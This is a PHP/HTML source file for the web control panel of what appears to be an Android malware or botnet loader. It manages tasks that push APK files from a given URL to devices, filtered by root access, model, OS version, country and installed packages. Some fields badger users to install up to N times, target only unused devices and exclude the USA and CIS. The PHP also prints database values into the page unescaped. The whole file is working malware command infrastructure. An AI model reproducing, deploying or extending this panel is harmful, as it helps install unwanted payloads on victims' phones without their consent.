<?php include 'check_sess_1.php';?>

		<div class="mdl-tabs mdl-js-tabs mdl-js-ripple-effect">
		<div class="mdl-tabs__tab-bar">
			<a href="#task-panel" class="mdl-tabs__tab is-active">Tasks</a>
			<a href="#add-task-panel" class="mdl-tabs__tab">Add Task</a>
			
		</div>
		 
		<div class="mdl-tabs__panel is-active" id="task-panel">
<ul style="padding-left: 0px;">

<div class="mdl-layout">
<h4>Active task:</h4>
</div>
<?php
$query = "SELECT * FROM `task` WHERE `active` = 1";	
$result = $mysqli->query($query);

$users_on_page = 20;

if(empty($_GET["p"])){
	$_GET["p"] = 1;
}

$p = (int) $_GET["p"];

$first = $p * $users_on_page-$users_on_page;
$query2 = "select * from `task`  WHERE `active` = 1 limit 1";
$result2 = $mysqli->query($query2);

?>

<table class="mdl-data-table mdl-js-data-table mdl-data-table--selectable mdl-shadow--2dp">
  <thead>
    <tr>
	  <th>Number</th>
      <th>Package</th>
	  <th>URL</th>
	  <th>Size</th>
	  <th>Times</th>
	  <th>Root</th>
	  <th>Model</th>
	  <th>OS ver</th>
	  <th class="mdl-data-table__cell--non-numeric">Country</th>
	  <th>Limit</th>
	  <th>Action</th>
    </tr>
  </thead>
  <tbody>
 
 
 
 
 
 
 <?php  
 $i = 1;
while($row = mysqli_fetch_assoc($result2)) 

{
	if ($row['country'] == ""){$country = 'Any';}
	else {$country = $row['country'];}
	
	if ($row['osver'] == ""){$osver = 'Any';}
	else {$osver = $row['osver'];}
	
	if ($row['model'] == ""){$model = 'Any';}
	else {$model = $row['model'];}
	
	if ($row['root'] == 1){$root = 'Yes';}
	else if ($row['root'] == 2){$root = 'No';}
	else if ($row['root'] == ""){$root = 'All';}
	else {$root = $row['root'];}
	
  echo '<tr>
				 
			     <td>' . $row['number'] . '</td>
				 <td>' . $row['package'] . '</td>
				 <td style="max-width: 150px;white-space: nowrap;overflow: hidden;	text-overflow: ellipsis;">' . $row['url'] . '</td>
				 <td>' . $row['size'] . '</td>
				 <td>' . $row['times'] . '</td>
			     <td class="root">' .  $root . '</td>
				 <td class="model">' . $model . '</td>
				 <td class="osver">' . $osver . '</td>
				 <td class="country">' . $country . '</td>
				 <td>' . $row['lim'] . '</td>
				 <td> 
					<button title="Stop task" onclick="remove_task('.$row['number'].')" style="min-width: 30px; height: 30px;width: 30px;" class="mdl-button mdl-js-button mdl-button--fab">
					<i class="material-icons">close</i>
					</button> 
				</td>
				 <td> 
					<button title="Show statistics" onclick="stat_task('.$row['number'].')" style="min-width: 30px; height: 30px;width: 30px;" class="mdl-button mdl-js-button mdl-button--fab">
					<i class="material-icons">show_chart</i>
					</button> 
				</td>
				<td> 
					<button title="Edit task" onclick="edit_task('.$row['number'].')" style="min-width: 30px; height: 30px;width: 30px;" class="mdl-button mdl-js-button mdl-button--fab">
					<i class="material-icons">create</i>
					</button> 
				</td>
			 </tr>';
}
?>

 </thead>
  <tbody>
    
   
  </tbody>
</table>
			</ul>
			
			<ul style="padding-left: 0px;">
			
			<?php

$query = "SELECT * FROM `task` WHERE `active` = 2";	
$result = $mysqli->query($query);

$first = $p*$users_on_page-$users_on_page;
$query2 = "select * from `task`  WHERE `active` = 2";
$result2 = $mysqli->query($query2);



?>
<div class="mdl-layout">
<h4>Not active tasks:</h4>
</div>


<table class="mdl-data-table mdl-js-data-table mdl-data-table--selectable mdl-shadow--2dp">
  <thead>
    <tr>
	  <th class="mdl-data-table__cell--non-numeric">Number</th>
      <th class="mdl-data-table__cell--non-numeric">Package</th>
	  <th class="mdl-data-table__cell--non-numeric">URL</th>
	  <th class="mdl-data-table__cell--non-numeric">Size</th>
	  <th class="mdl-data-table__cell--non-numeric">Times</th>
	  <th class="mdl-data-table__cell--non-numeric">Root</th>
	  <th class="mdl-data-table__cell--non-numeric">Model</th>
	  <th class="mdl-data-table__cell--non-numeric">OS ver</th>
	  <th class="mdl-data-table__cell--non-numeric">Country</th>
	  <th class="mdl-data-table__cell--non-numeric">Limit</th>
	  <th class="mdl-data-table__cell--non-numeric">Action</th>
    </tr>
  </thead>
  <tbody>
 
 
 
 
 
 
 <?php  
 $i = 1;
while($row = mysqli_fetch_assoc($result2)) 
{
	if ($row['country'] == ""){$country = 'Any';}
	else {$country = $row['country'];}
	
	if ($row['osver'] == ""){$osver = 'Any';}
	else {$osver = $row['osver'];}
	
	if ($row['model'] == ""){$model = 'Any';}
	else {$model = $row['model'];}
	
	if ($row['root'] == 1){$root = 'Yes';}
	else if ($row['root'] == 2){$root = 'No';}
	else if ($row['root'] == ""){$root = 'All';}
	else {$root = $row['root'];}
	
  echo '<tr>
				 
			     <td>' . $row['number'] . '</td>
				 <td>' . $row['package'] . '</td>
				 <td style="max-width: 150px;white-space: nowrap;overflow: hidden;	text-overflow: ellipsis;">' . $row['url'] . '</td>
				 <td>' . $row['size'] . '</td>
				 <td>' . $row['times'] . '</td>
			     <td class="root">' .  $root . '</td>
				 <td style="max-width: 150px;white-space: nowrap;overflow: hidden;	text-overflow: ellipsis;" class="model">' . $model . '</td>
				 <td class="osver">' . $osver . '</td>
				 <td style="max-width: 150px;white-space: nowrap;overflow: hidden;	text-overflow: ellipsis;" class="country">' . $country . '</td>
				 <td>' . $row['lim'] . '</td>
				  <td> 
					<button title="Start task" onclick="repeat_task('.$row['number'].')" style="min-width: 30px; height: 30px;width: 30px;" class="mdl-button mdl-js-button mdl-button--fab">
					<i class="material-icons">refresh</i>
					</button> 
				</td>
				
				  <td> 
					<button title="Show statistics" onclick="stat_task('.$row['number'].')" style="min-width: 30px; height: 30px;width: 30px;" class="mdl-button mdl-js-button mdl-button--fab">
					<i class="material-icons">show_chart</i>
					</button> 
				</td>
				<td> 
					<button title="Edit task" onclick="edit_task('.$row['number'].')" style="min-width: 30px; height: 30px;width: 30px;" class="mdl-button mdl-js-button mdl-button--fab">
					<i class="material-icons">create</i>
					</button> 
				</td>
				<td> 
					<button title="Delete task" onclick="del_Task('.$row['number'].')" style="min-width: 30px; height: 30px;width: 30px;" class="mdl-button mdl-js-button mdl-button--fab">
					<i class="material-icons">delete</i>
					</button> 
				</td>
			 </tr>';
}
?>

 </thead>
  <tbody>
    
   
  </tbody>
</table>
			</ul>
		</div>
		
		
		
		
		
		
		
		
		
		
		
<div class="mdl-tabs__panel" id="add-task-panel" style="font-color: #000;">

<table style="color: black; margin: 0 auto; margin-top: 10px" border=0 class="mdl-data-table mdl-js-data-table mdl-shadow--2dp">
  <thead>
    
  </thead>
  <tbody>
    <tr>
<!--
      <td class="mdl-data-table__cell--non-numeric">
		<label for="task_number">ID</label>
		<input value="<?php echo date('dmGis');?>" type="text" readonly disabled pattern="-?[0-9]*(\.[0-9]+)?" id="task_number">
	  </td>
-->
	<input value="<?php echo date('dmGis');?>" type="hidden" readonly disabled pattern="-?[0-9]*(\.[0-9]+)?" id="task_number">
	  
	  <td class="mdl-data-table__cell--non-numeric" style='width: 200px'>
		<label for="task_url">Direct URL to APK</label><br />
		<input type="text" placeholder="http://server.com/file.apk" style='width: 100%' id="task_url" />
	  </td>

	  <td class="mdl-data-table__cell--non-numeric">
		<label for="task_landing">Landing URL (can be empty)</label><br />
		<input placeholder="http://server.com/landing.html" style='width: 100%' type="text" id="task_landing" />
	  </td>
	</tr>
<!--
	<tr>
	  <td class="mdl-data-table__cell--non-numeric">
		<label  for="task_size">APK size in bytes (<a href="?command=filesize">check here</a>)</label>
		<input  type="text" placeholder="100500" pattern="-?[0-9]*(\.[0-9]+)?" id="task_size">
	  </td>
</tr>
	  <td class="mdl-data-table__cell--non-numeric">
		<label for="task_package">Package name (<a href="?command=filesize">check here</a>)</label>
		<input type="text" placeholder='com.android.vending' id="task_package">
	  </td>
-->	
	
	<tr>
	  <td class="mdl-data-table__cell--non-numeric">
<!--
		<input  type="text" pattern="-?[0-9]*(\.[0-9]+)?" id="task_root">
-->
		<label  for="task_root">Root is required</label>
		<select id="task_root">
			<option value='1'>Yes</option>
			<option value='2'>No</option>
			<option value='' selected>Any</option>
		</select>
	  </td>
	  
	  <td class="mdl-data-table__cell--non-numeric">
		<label  for="task_times">Ask user to install N times</label>
		<input  type="text" pattern="-?[0-9]*(\.[0-9]+)?" value='3' placeholder='3' size='5' id="task_times">
	  </td>
	</tr>
	
	<tr>
	  <td class="mdl-data-table__cell--non-numeric">
		<label  for="task_country">Allowed countries (leave empty for any)</label><br />
		<input placeholder='US,GB,ES' style='width: 100%' type="text" id="task_country"><br />
		<span style='color:blue; font-size: 9pt'>USA and CIS aren't allowed</span>
	  </td>
	  
	  <td class="mdl-data-table__cell--non-numeric">
		<label  for="task_lim">Limit (install on N devices maximum)</label>
		<input placeholder='10' size='5' type="text" pattern="-?[0-9]*(\.[0-9]+)?" id="task_lim">
	  </td>
	</tr>
	
	<tr>
	  <td class="mdl-data-table__cell--non-numeric">
		<label  for="task_model">Model (leave empty for any)</label><br />
		<input placeholder='Galaxy Ass' style='width: 100%' type="text" id="task_model">
		
	  </td>
	  
	  <td class="mdl-data-table__cell--non-numeric">
		<label  for="task_osver">Android versions (leave empty for any)</label><br />
		<input placeholder='5.0,5.1,7.0' style='width: 100%' type="text" id="task_osver">
	  </td>
	  
	</tr>

	<tr>
	  <td class="mdl-data-table__cell--non-numeric">
		  <label  for="task_packy">Device should contain packages</label><br />
			<input  type="text" id="task_packy" placeholder='com.app1,com.app2,com.app3' style='width: 100%' />
	  </td>
	  
	  <td class="mdl-data-table__cell--non-numeric">
		<label  for="task_packn">Device should NOT contain packages</label><br />
	  	<input  type="text" id="task_packn" placeholder='com.app1,com.app2,com.app3' style='width: 100%' />
	  </td>

	</tr>	
	<tr>
	  <td class="mdl-data-table__cell--non-numeric">
	  	<label class="mdl-checkbox mdl-js-checkbox mdl-js-ripple-effect" for="check-box-device">
			<input id="task_device_use" name="task_device_use" type="hidden">
			<input type="checkbox" id="check-box-device" class="mdl-checkbox__input" checked>
			<span class="mdl-checkbox__label">Only not used devices</span>
		</label>
	  </td>
	</tr>

<tr>
<td colspan='2' style='text-align: center'>
	<p id='error_text' style='color: red'></p>
	<button id='add_button_id' style="background-color: #37474f; color: white;" onclick="addTask();" class="mdl-button mdl-js-button mdl-button--raised">
<i style="" class="material-icons">add_circle</i> Add task</button><br />
Task will be added to 'Not active' list. Click <i class="material-icons">refresh</i> to start task.
 </td>
</tr>
	
    	
  </tbody>
  
</table>
</div>
</div>

<div id="ModalStat" class="modal">
    <div class="modal-header">
       
					<button onclick="$('#ModalStat').hide();" style="min-width: 30px; height: 30px;width: 30px; left: 95%;" class="mdl-button mdl-js-button mdl-button--fab">
					<i class="material-icons">close</i>
					</button> 
				 
				 
        <h5 id="myModalLabel">Statistics of task: <span id="stat_task_num"> </span></h3>
    </div>
    <div class="modal-body">
	
	<table class="mdl-data-table mdl-js-data-table mdl-data-table--selectable mdl-shadow--2dp">
  <thead>
   
  </thead>
  <tbody>
    <tr>
      <td class="mdl-data-table__cell--non-numeric">Take file</td>
      <td id="stat_task_take" >Loading...</td>
      
    </tr>
    <tr>
      <td class="mdl-data-table__cell--non-numeric">Install file</td>
      <td id="stat_task_run">Loading...</td>
      
    </tr>
    <tr>
      <td class="mdl-data-table__cell--non-numeric">Success rate</td>
      <td id="stat_task_procent">Loading...</td>
     
    </tr>
  </tbody>
</table>

		
		
		
		
    </div>
   
</div>


<div id="ModalEdit" class="modal mdl-shadow--6dp">
    <div class="modal-header">
		<button onclick="$('#ModalEdit').hide();" style="background-color: white; min-width: 30px; height: 30px; width: 30px; float: right;" class="mdl-button mdl-js-button mdl-button--fab"><i class="material-icons">close</i></button> 
		<h4 id="myModalLabel1" style='color: white'>Edit task</h4>
    </div>
    
    <div class="modal-body">
		<div class="">
		<input type="hidden" id="real_task_id">
		<section>
		
		<style>
.demo-list-item {
   
   background-color: #fff;
   padding: 20px;
}
.mdl-list__item{
	height: 40px;
}
.edit_task {width: 300px;}
.lbl {width: 100px; border: 1px solid red;}
</style>

<ul class="demo-list-item mdl-list mdl-shadow--2dp">
<!--
  <li class="mdl-list__item">
    <span style="width: 400px">
		Task #:
    </span>
	 <span class="">
      <input style="width: 400px" type="text" placeholder='1234' id="task_edit_number">
    </span>
  </li>
-->
	<input type="hidden" id="task_edit_number" />
	<input type="hidden" id="task_edit_url_original" />
<!--
  <li class="mdl-list__item">
    <span style="width: 400px">
		Package name (<a href="?command=filesize">check here</a>):
    </span>
	 <span class="">
      <input style="width: 400px" type="text" placeholder='com.android.vending' id="task_edit_package"><br>
    </span>
  </li>
  
  <li class="mdl-list__item">
    <span style="width: 400px">
     APK size in bytes (<a href="?command=filesize">check here</a>):
    </span>
	 <span class="">
     <input style="width: 400px" type="text" placeholder='100500' id="task_edit_size"><br>
    </span>
  </li>
-->
  
  <li class="mdl-list__item">
    <span style="width: 400px">
     Direct URL to APK:
    </span>
	 <span class="">
      <input style="width: 400px" type="text" placeholder="http://server.com/file.apk" id="task_edit_url">
    </span>
  </li>
  
  <li class="mdl-list__item">
    <span style="width: 400px">
    Landing URL (can be empty):
    </span>
	 <span class="">
     <input style="width: 400px" type="text" placeholder="http://server.com/landing.html" id="task_edit_landing">
    </span>
  </li>
    
  <li class="mdl-list__item">
    <span style="width: 400px">
     Ask user to install N times:
    </span>
	 <span class="">
      <input style="width: 400px" type="text" value='3' placeholder='3' id="task_edit_times">
    </span>
  </li>
  
  <li class="mdl-list__item">
    <span style="width: 400px">
     Root is required:
    </span>
	 <span class="">
<!--
     <input style="width: 400px" type="text" id="task_edit_root">
-->
     <select id="task_edit_root">
		<option value='1'>Yes</option>
		<option value='2'>No</option>
		<option value='' selected>Any</option>
     </select>
    </span>
  </li>
  
  <li class="mdl-list__item">
    <span style="width: 400px">
     Model (leave empty for any):
    </span>
	 <span class="">
		<input style="width: 400px" type="text" placeholder='Galaxy Ass' id="task_edit_model">
    </span>
  </li>
  
  <li class="mdl-list__item">
    <span style="width: 400px">
      Android versions (leave empty for any):
    </span>
	 <span class="">
     	<input style="width: 400px" type="text" placeholder='5.0,5.1,7.0' id="task_edit_osver">
    </span>
  </li>
  
  <li class="mdl-list__item">
	<span style="width: 400px">Allowed countries (leave empty for any):</span>
    <input style="width: 400px" type="text" placeholder='US,GB,ES' id="task_edit_country" /><br />
	<span style='color:blue; font-size: 9pt'>USA and CIS aren't allowed</span>
	</li>
  
  <li class="mdl-list__item">
    <span style="width: 400px">
    Limit (install on N devices maximum):
    </span>
	 <span class="">
     <input style="width: 400px" type="text" placeholder='10' id="task_edit_lim">
    </span>
  </li>
  
  <li class="mdl-list__item">
    <span style="width: 400px">
    Device should contain packages:
    </span>
	 <span class="">
     <input style="width: 400px" type="text" placeholder='com.app1,com.app2,com.app3' id="task_edit_packy">
    </span>
  </li>
  
  <li class="mdl-list__item">
    <span style="width: 400px">
	Device should NOT contain packages:
    </span>
	 <span class="">
     <input style="width: 400px" type="text" placeholder='com.app1,com.app2,com.app3' id="task_edit_packn">
    </span>
  </li>
  
  <li class="mdl-list__item">
    <span style="width: 400px">
	Install only on clear devices:
    </span>
	 <span class="">
     <input style="width: 400px" type="checkbox" id="task_edit_device_clear">
    </span>
  </li>
  
</ul>
</section>
</div>
   
    </div>
 
    <div class="modal-footer" style='text-align: center'>
		<p id='error_text_2' style='color: red; background-color: white; border-radius: 5px'></p>
        <button id='save_button_id' onclick="edit_task_save();" class="mdl-button mdl-js-button mdl-button--raised" style='background-color: white'>
		<i class="material-icons">save</i> Save task
		</button>
    </div>
</div>

